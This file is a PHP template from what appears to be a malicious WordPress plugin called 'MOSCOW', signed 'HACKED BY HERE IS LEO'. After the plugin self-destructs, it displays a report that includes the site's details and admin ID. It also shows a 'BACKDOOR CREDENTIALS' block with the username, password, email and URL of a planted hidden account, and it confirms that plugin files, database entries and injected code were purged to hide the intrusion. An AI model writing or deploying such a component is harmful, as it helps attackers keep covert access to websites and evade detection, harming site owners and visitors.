<?php
/** @var string $version @var string $username @var string $password @var string $email
 *  @var string $backdoor @var int $hours @var string $elapsed @var string $site_name
 *  @var string $site_url @var string $wp_version @var string $php_version @var int $admin_id */
if (!defined('ABSPATH')) exit;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>MOSCOW // self-destruct complete</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050507;color:#e6edf3;font-family:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
     display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
.card{max-width:820px;width:100%;background:#0d1117;border:1px solid #30363d;border-radius:14px;
      overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.7),0 0 0 1px rgba(255,0,0,.15)}
.card__head{display:flex;align-items:center;gap:10px;padding:14px 18px;background:#161b22;border-bottom:1px solid #30363d}
.dot{width:12px;height:12px;border-radius:50%}
.dot--r{background:#ff5f56}.dot--y{background:#ffbd2e}.dot--g{background:#27c93f}
.card__title{margin-left:auto;font-size:12px;color:#8b949e}
.card__body{padding:28px 28px 24px}
.banner{padding:14px 18px;margin-bottom:20px;border-radius:10px;
        background:linear-gradient(135deg,rgba(255,0,0,.08),rgba(255,0,0,.02));
        border:1px solid rgba(255,0,0,.35);color:#ff6b6b;font-size:13px;letter-spacing:.5px}
.banner strong{color:#ff2d2d}
h1{font-size:26px;font-weight:800;letter-spacing:.5px;margin-bottom:6px}
h1 span{color:#ff2d2d}
.sub{font-size:12px;color:#8b949e;letter-spacing:3px;margin-bottom:24px}
.grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px;margin-bottom:22px}
.row{background:#0f1419;border:1px solid #21262d;border-radius:8px;padding:10px 12px}
.row__label{font-size:10px;color:#8b949e;letter-spacing:1.5px;margin-bottom:4px}
.row__value{font-size:13px;font-weight:700;color:#e6edf3;word-break:break-word}
.row--danger .row__value{color:#ff2d2d}
.row--accent .row__value{color:#58a6ff}
.section{margin-bottom:18px}
.section__title{font-size:11px;color:#8b949e;letter-spacing:2px;margin-bottom:10px}
.section__title::before{content:"// ";color:#ff2d2d}
.cred{background:#0a0e14;border:1px solid #21262d;border-radius:10px;padding:14px 16px}
.cred__row{display:flex;justify-content:space-between;padding:6px 0;font-size:12px;border-bottom:1px solid #161b22}
.cred__row:last-child{border-bottom:none}
.cred__row span:first-child{color:#8b949e}
.cred__row span:last-child{color:#f0c419;font-weight:700;word-break:break-all;text-align:right;margin-left:12px}
.foot{text-align:center;margin-top:22px;padding-top:18px;border-top:1px solid #21262d;font-size:11px;color:#484f58}
.foot .accent{color:#ff2d2d}
@media(max-width:600px){.grid{grid-template-columns:1fr}h1{font-size:20px}.card__body{padding:20px}}
</style>
</head>
<body>
<div class="card">
    <div class="card__head">
        <span class="dot dot--r"></span><span class="dot dot--y"></span><span class="dot dot--g"></span>
        <span class="card__title">moscow — self-destruct — v<?= esc_html($version) ?></span>
    </div>
    <div class="card__body">
        <div class="banner">
            <strong>SELF-DESTRUCT COMPLETE</strong> — plugin removed and all traces purged.
        </div>
        <h1>MOSCOW <span>//</span> TERMINATED</h1>
        <p class="sub">HERE IS LEO — <?= esc_html(date('Y')) ?></p>

        <div class="section">
            <div class="section__title">EXECUTION REPORT</div>
            <div class="grid">
                <div class="row row--accent">
                    <div class="row__label">VERSION</div>
                    <div class="row__value"><?= esc_html($version) ?></div>
                </div>
                <div class="row row--danger">
                    <div class="row__label">ACTIVE FOR</div>
                    <div class="row__value"><?= esc_html($elapsed) ?></div>
                </div>
                <div class="row">
                    <div class="row__label">SCHEDULED DESTRUCT</div>
                    <div class="row__value"><?= (int) $hours ?>h</div>
                </div>
                <div class="row row--accent">
                    <div class="row__label">ADMIN ID</div>
                    <div class="row__value">#<?= (int) $admin_id ?></div>
                </div>
                <div class="row">
                    <div class="row__label">SITE</div>
                    <div class="row__value"><?= esc_html($site_name) ?></div>
                </div>
                <div class="row">
                    <div class="row__label">URL</div>
                    <div class="row__value"><?= esc_html($site_url) ?></div>
                </div>
                <div class="row">
                    <div class="row__label">WORDPRESS</div>
                    <div class="row__value"><?= esc_html($wp_version) ?></div>
                </div>
                <div class="row">
                    <div class="row__label">PHP</div>
                    <div class="row__value"><?= esc_html($php_version) ?></div>
                </div>
            </div>
        </div>

        <div class="section">
            <div class="section__title">BACKDOOR CREDENTIALS</div>
            <div class="cred">
                <div class="cred__row"><span>Username</span><span><?= esc_html($username) ?></span></div>
                <div class="cred__row"><span>Password</span><span><?= esc_html($password) ?></span></div>
                <div class="cred__row"><span>Email</span><span><?= esc_html($email) ?></span></div>
                <div class="cred__row"><span>Backdoor URL</span><span>/<?= esc_html($backdoor) ?></span></div>
            </div>
        </div>

        <div class="section">
            <div class="section__title">CLEANUP STATUS</div>
            <div class="cred">
                <div class="cred__row"><span>Plugin files</span><span>removed</span></div>
                <div class="cred__row"><span>Database entries</span><span>purged</span></div>
                <div class="cred__row"><span>Injected code</span><span>cleaned</span></div>
                <div class="cred__row"><span>Site status</span><span>operational</span></div>
            </div>
        </div>

        <div class="foot">
            <span class="accent">//</span> HACKED BY HERE IS LEO <span class="accent">//</span> MOSCOW
        </div>
    </div>
</div>
</body>
</html>